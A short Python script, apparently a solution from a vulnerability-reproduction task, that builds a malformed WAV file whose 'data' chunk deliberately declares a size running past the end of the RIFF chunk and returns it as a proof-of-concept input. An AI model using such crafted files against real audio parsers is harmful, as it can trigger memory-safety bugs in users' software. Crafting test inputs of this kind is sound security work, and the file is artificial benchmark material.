import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        riff_size = 36  # Size of WAVE chunk (fmt chunk + data header only)
        header = b'RIFF' + struct.pack('<I', riff_size) + b'WAVE'
        fmt_chunk = (
            b'fmt ' +
            struct.pack('<I', 16) +  # fmt chunk size
            struct.pack('<HHIIHH',
                        1,      # PCM
                        1,      # Channels
                        8000,   # Sample rate
                        8000,   # Byte rate = sample_rate * channels * (bits_per_sample/8)
                        1,      # Block align = channels * (bits_per_sample/8)
                        8)      # Bits per sample
        )
        data_size = 14  # Intentionally exceeds end of RIFF chunk
        data_chunk = b'data' + struct.pack('<I', data_size) + (b'\x00' * data_size)
        poc = header + fmt_chunk + data_chunk
        return poc
